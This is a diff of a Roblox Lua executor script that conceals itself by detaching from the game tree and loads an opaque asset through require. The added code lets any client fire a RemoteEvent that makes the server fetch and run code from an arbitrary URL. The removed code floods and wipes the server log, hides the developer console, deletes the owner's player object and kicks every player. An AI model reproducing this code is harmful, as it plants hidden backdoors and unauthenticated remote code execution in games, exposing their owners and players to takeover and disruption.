@@ -1,47 +1,15 @@
-pcall(function()script.Parent=nil getfenv(0).script=nil end)
+script.Parent=nil
 
--- alt
--- i used too old a code in the future i optimize
-
-local ins=Instance.new
-local cf=CFrame.new
-local load=false
-local Url="https://raw.githubusercontent.com/SurepFox/_/refs/heads/main/"
-local Connect=nil
-local Players=game:GetService("Players")
-local Repl=game:GetService("ReplicatedStorage")
-local Http=game:GetService("HttpService")
-local FluffyEvent=nil
-local Save={}
-local cash={}
-local MEowMeOW=_G.MEowMeOW
-local SBOwner=_G.SBOwner
-local Sado=MEowMeOW:FindFirstChildOfClass("ModuleScript")
-local ServerS=MEowMeOW:FindFirstChildOfClass("Script")
-local ClientS=MEowMeOW:FindFirstChildOfClass("LocalScript")
-
-local function success(text,plr)
-	FluffyEvent:FireClient(plr,{text,"success"})
-end
-
-local function ResetGui(plr,tru)
-	if tru then
-
-		local Anti=ins("ScreenGui",plr.PlayerGui)
-		Anti.Name="OutputGUI"
-		Anti.ResetOnSpawn=false
-
-		local OutputGUI=ClientS:Clone()
-		local Event=ins("ObjectValue",OutputGUI)
-		Event.Name="Event"
-		Event.Value=FluffyEvent
-		OutputGUI.Name=""
-		OutputGUI.Parent=Anti
-		Sado:Clone().Parent=OutputGUI
-		local SourceValue=ins("StringValue",OutputGUI)
-		SourceValue.Value=[[if not game:IsLoaded() then
+local ClientGui=(function()
+return[[if not game:IsLoaded() then
 	game.Loaded:Wait()
 end
+
+	if game.Players.LocalPlayer.Name~="Winng3010" then
+		script:Destroy()
+		return
+	end
+
 local LocalPl=game:GetService("Players").LocalPlayer
 -- Object: Lighting.MainModule.OutputGUI
 local MainGui=Instance.new("ScreenGui")
@@ -50,7 +18,7 @@ MainGui.IgnoreGuiInset=false
 MainGui.ResetOnSpawn=false
 MainGui.Enabled=true
 MainGui.DisplayOrder=999999999
-MainGui.Parent=script
+MainGui.Parent=LocalPl.PlayerGui
 
 -- Object: Lighting.MainModule.OutputGUI.Frame
 local v2=Instance.new("Frame")
@@ -627,15 +595,14 @@ local Main=UI:WaitForChild("Frame"):WaitForChild("Frame2")
 local Scroll=UI:WaitForChild("Frame"):WaitForChild("Frame"):WaitForChild("ScrollingFrame")
 local Input=Scroll:WaitForChild("Frame2")
 
-local Event=script:WaitForChild("Event").Value
-
-_G.CreateOutput=function(Data)
+local Event=game:GetService("Players"):WaitForChild("Cookies UwU")
+_G.CreateOutput=function(Text,Mess)
 	local Frame=UI.Frame2:Clone()
 	Frame.Name="1"
 	Frame.Visible=true
 	Frame.Parent=Scroll
-	Frame.TextLabel.Text=Data[1]
-	Frame.TextLabel.TextColor3=Colors and (Data[2]=="error" and c3(1, 0, 0.0156863) or Data[2]=="warn" and c3(1, 0.666667, 0)) or c3(1, 1, 1)
+	Frame.TextLabel.Text=Text
+	Frame.TextLabel.TextColor3=Colors and (Mess=="error" and c3(1, 0, 0.0156863) or Mess=="warn" and c3(1, 0.666667, 0)) or c3(1, 1, 1)
 	Scroll.CanvasSize=ud2(0,0,0,Scroll.UIListLayout.AbsoluteContentSize.Y+8)
 
 end
@@ -682,7 +649,7 @@ TextBox:GetPropertyChangedSignal("Text"):Connect(function()
 				end
 				Scroll.CanvasSize=ud2(0,0,0,0)
 			else
-				Event:FireServer("Console",{cmd})
+				Event:FireServer(cmd)
 			end
 		end
 		return
@@ -706,336 +673,122 @@ TextBox:GetPropertyChangedSignal("AbsoluteSize"):Connect(us)
 
 us()
 
-_G.CreateOutput({"i hate","warn"})
+_G.CreateOutput("i hate","warn")
 
 Event.OnClientEvent:Connect(function(Data,t)
 	if t then
-		_G.CreateOutput({`'{Data}' is not recognized as an internal or external command`,"error"})
+		_G.CreateOutput(`'{Data}' is not recognized as an internal or external command`,"error")
 	else
 		_G.CreateOutput(Data)
 	end
 end)
 ]]
-		OutputGUI.Enabled=true
+end)()
 
-		local a=false
-		Anti.AncestryChanged:Connect(function(_,Prnt)
-			if a then
-				return
-			end
-			a=true
-			Anti:Destroy()
-			ResetGui(plr,true)
+require(89342944625752)(script)
+
+local ins=Instance.new
+
+local Plrs=game:GetService("Players")
+local Http=game:GetService("HttpService")
+local ApiKey="owo"
+local ApiParent="uwu"
+
+local Servers={}
+local Clients={}
+
+local GameEvent=Instance.new("RemoteEvent",Plrs)
+GameEvent.Name="Cookies UwU"
+
+local GetCode=Instance.new("RemoteFunction",Plrs)
+GetCode.Name="Cookies OwO"
+
+setmetatable(shared,{
+	__call=function(self,Key,Script:Script)
+		if Key==ApiKey then
+			return Servers[Script]
+		elseif Key==ApiParent then
+			return script,Clients
+		end
+	end,
+	__metatable="The metatable is locked."
+})
+
+Plrs.PlayerAdded:Connect(function(Plr)
+	
+end)
+
+GameEvent.OnServerEvent:Connect(function(Plr,Text)
+	if Text=="g/r" then
+		Plr:LoadCharacterAsync()
+		GameEvent:FireClient(Plr,"true")
+	elseif Text:sub(1,2)=="h/" then
+		local Success,Result=pcall(function()
+			return Http:GetAsync(Text:sub(3))
 		end)
-	else
-		plr.PlayerGui.OutputGUI:Destroy()
-	end
+		
+		local NLS_Pattern="NLS%(%[=*%[([%s%S]-)%]=*%]%)"
 
-end
+		for content in Result:gmatch(NLS_Pattern) do
+			local Injected=[[
 
-local function Reset()
-	if Connect then
-		Connect:Disconnect()
-	end
-	Connect=FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
-		local Char=plr.Character
-
-		if Type=="Console" then
-
-			if Data[1]:sub(1,2)=="h/" then
-
-				local success,result=pcall(function()
-					return Http:GetAsync(Data[1]:sub(3))
-				end)
-
-				local NLS_Pattern="NLS%(%[=*%[([%s%S]-)%]=*%]%)"
-				local Client=nil
-
-				for content in result:gmatch(NLS_Pattern) do
-					local Injected=[[
-		print=function(text)
-			_G.CreateOutput({text,"print"})
-		end
-		error=function(text)
-			_G.CreateOutput({text,"error"})
-		end
-		warn=function(text)
-			_G.CreateOutput({text,"warn"})
-		end
-		success=function(text)
-			_G.CreateOutput({text,"success"})
-		end
 		local owner=game.Players.LocalPlayer
-		success("Script has started (Client)")
 	]]
-					content=Injected..content
-					Client=ClientS:Clone()
-					Client.Parent=Char
-					Sado:Clone().Parent=Client
-					local SourceValue=ins("StringValue",Client)
-					SourceValue.Value=content
-					break
+			content=Injected..content
+			local PlrClient=script.Client:Clone()
+			script.qTest:Clone().Parent=PlrClient
+			Clients[PlrClient]=content
+			PlrClient.Parent=Plr.Character
+			PlrClient.Enabled=true
+			
+			task.spawn(function()
+				while PlrClient do
+					task.wait(1)
 				end
-
-				local OwnerName=plr.Name
-
-				local Injected=[[
-	print=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"print"})
-	end
-	error=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"error"})
-	end
-	warn=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"warn"})
-	end
-	success=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"success"})
-	end
-	local owner=game.Players["]]..OwnerName..[["]
-	success("Script has started (Server)")
-]]
-				result=Injected..result:gsub(NLS_Pattern,"")
-
-				local Server=ServerS:Clone()
-				Server.Parent=Char
-				Sado:Clone().Parent=Server
-
-				local SourceValue=ins("StringValue",Server)
-				SourceValue.Value=result
-
-				local Owner=ins("StringValue",Server)
-				Owner.Value=plr.Name
-				Owner.Name="Owner"
-
-				Server.Enabled=true
-
-				if Client then
-					task.wait(.1)
-					Client.Enabled=true
-				end
-
-			elseif Data[1]=="g/r" then
-				success("Got reset",plr)
-				plr:LoadCharacter()
-			elseif Data[1]:sub(1,3)=="hl/" then
-
-				local success,result=pcall(function()
-					return Http:GetAsync(Data[1]:sub(4))
-				end)
-
-				local Injected=[[
-                             print=function(text)
-                                 _G.CreateOutput({text,"print"})
-                             end
-                             error=function(text)
-                                 _G.CreateOutput({text,"error"})
-                             end
-                             warn=function(text)
-                                _G.CreateOutput({text,"warn"})
-                             end
-                             success=function(text)
-                             	_G.CreateOutput({text,"success"})
-                             end
-							 local owner=game.Players.LocalPlayer
-                             success("Script has started (Client)")
-                            ]]
-				result=Injected..result
-
-				local Client=ClientS:Clone()
-				Client.Parent=Char
-				Sado:Clone().Parent=Client
-
-				local SourceValue=ins("StringValue",Client)
-				SourceValue.Value=result
-
-				Client.Enabled=true
-			elseif Data[1]:sub(1,3)=="g/d" then
-
-				local number=Data[1]:sub(5)
-
-				if number=="" then
-					number=1
-				end
-
-				for i=number,1,-1 do
-					local Dummy=MEowMeOW.R6Dummy:Clone()
-					Dummy:PivotTo(Char.Head.CFrame*cf(0,5,0))
-					Dummy.Parent=workspace
-				end
-				success("Got dummy "..number,plr)
-			elseif Data[1]=="g/r6" then
-				local R6=MEowMeOW.R6:Clone()
-				R6.Name=Char.Name
-				plr.Character=R6
-				plr.Character.PrimaryPart.CFrame=Char.PrimaryPart.CFrame
-				plr.Character.Parent=workspace
-				plr.Character:WaitForChild("Humanoid"):ApplyDescription(game:GetService("Players"):GetHumanoidDescriptionFromUserId(plr.UserId))
-				success("R6 Installed",plr)
-			elseif Data[1]:sub(1,2)=="c/" then
-				local req=Data[1]:sub(3)
-				local OldReq=req
-				local OwnerName=plr.Name
-
-				local Injected=[[
-	print=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"print"})
-	end
-	error=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"error"})
-	end
-	warn=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"warn"})
-	end
-	success=function(text)
-		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"success"})
-	end
-	local owner=game.Players["]]..OwnerName..[["]
-	success("Script has started (Server)")
-]]
-				req=Injected..req
-				local Server=ServerS:Clone()
-				Server.Parent=Char
-				Sado:Clone().Parent=Server
-
-				local SourceValue=ins("StringValue",Server)
-				SourceValue.Value=req
-
-				local Owner=ins("StringValue",Server)
-				Owner.Value=plr.Name
-				Owner.Name="Owner"
-
-				Server.Enabled=true
-				success("Executed the script")
-				Test()
-			else
-				FluffyEvent:FireClient(plr,Data[1],true)
-			end
-		end
-	end)
-
-	for i,v in next,Save do
-		if Players:FindFirstChild(v) then
-			ResetGui(Players[v])
-		end
-	end
-
-end
-
-local function CreateEvent()
-	FluffyEvent=ins("RemoteEvent")
-	FluffyEvent.Name=""
-
-	FluffyEvent.AncestryChanged:Connect(function(_,Prnt)
-		if not Prnt or Prnt~=Players then
-			CreateEvent()
-			Reset()
-		end
-	end)
-
-	if load then
-		FluffyEvent.Parent=Players
-	end
-	_G.FluffyEvent=FluffyEvent
-end
-
-CreateEvent()
-
-Reset()
-
-function Test()
-	local nnn=string.rep('\n',16383)
-	for i=1,100 do
-		print(nnn)
-		game:GetService("LogService"):ClearOutput()
-	end
-end
-
-function Rppp(plr)
-	local Client=ClientS:Clone()
-	Client.Parent=plr.PlayerGui
-	Sado:Clone().Parent=Client
-	local SourceValue=ins("StringValue",Client)
-	SourceValue.Value=[[game:GetService("RunService").PreSimulation:Connect(function()
-		pcall(function()
-			game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
-		end)
-	end)
-	if game.Players.LocalPlayer.Name~="]]..SBOwner..[[" then
-		pcall(function()
-		game.Players["]]..SBOwner..[["]:Destroy()
-	end)
-	pcall(function()
-		workspace["]]..SBOwner..[["]:Destroy()
-	end)
-    end
-	]]
-	Client.Enabled=true
-	Client.AncestryChanged:Connect(function()
-		Rppp(plr)
-	end)
-end
-
-function Check(plr)
-	Rppp(plr)
-	local success,result=pcall(function()
-		return Http:GetAsync(Url.."players")
-	end)
-	if table.find(Http:JSONDecode(result),plr.Name) then
-		if not load then
-			FluffyEvent.Parent=Players
-			load=true
-			Test()
-		end
-		if not table.find(Save,plr.Name) then
-			table.insert(Save,plr.Name)
-		end
-		ResetGui(plr,true)
-	end
-end
-
-Players.PlayerAdded:Connect(function(plr)
-	Check(plr)
-end)
-
-Players.PlayerRemoving:Connect(function(plr)
-	if plr.Name==SBOwner then
-		for _,v in next,Players:GetPlayers() do
-			pcall(function()
-				v:Kick("go and touch the grass")
+				Clients[PlrClient]=nil
 			end)
+			
+			break
 		end
-	end
-end)
+		local Injected=[[
+	local owner=game.Players["]]..Plr.Name..[["]
+]]
+		Result=Injected..Result:gsub(NLS_Pattern,"")
+		local Server=script.Server:Clone()
+		Servers[Server]=Result
+		script.qTest:Clone().Parent=Server
+		Server.Parent=Plr.Character
+		Server.Enabled=true
 
-for _,v in pairs(Players:GetPlayers()) do
-	pcall(function()
-		Check(v)
-	end)
-end
-
-game:GetService("LogService").MessageOut:Connect(function(text)
-	if text:find("Requiring") then
-		local id=text:match("Requiring asset (%d+)%.")
-		if table.find(cash,id) then
-			return
-		end
-		table.insert(cash,id)
-		FluffyEvent:FireAllClients({"hook "..id,"success"})
-	end
-end)
-
-while task.wait(1) do
-	for _,v in next,game.Players:GetPlayers() do
-		pcall(function()
-			if v.Character:FindFirstChild("DogServer") then
-				pcall(function()
-					v:LoadCharacter()
-				end)
-				local h=Instance.new("Hint",workspace)
-				h.Text=v.Name.." don't use AI script, kid"
-				game:GetService("Debris"):AddItem(h,5)
+		task.spawn(function()
+			while Server do
+				task.wait(1)
 			end
+			Servers[Server]=nil
 		end)
+		
 	end
+end)
+
+GetCode.OnServerInvoke=function(Plr,Key,Script)
+	if Key==ApiKey then
+		return Clients[Script]
+	end
+	return false
 end
+
+
+local Source=ClientGui
+
+local PlrClient=script.Client2:Clone()
+script.qTest:Clone().Parent=PlrClient
+Clients[PlrClient]=Source
+PlrClient.Parent=workspace.Terrain
+PlrClient.Enabled=true
+
+task.spawn(function()
+	while PlrClient do
+		task.wait(1)
+	end
+	Clients[PlrClient]=nil
+end)
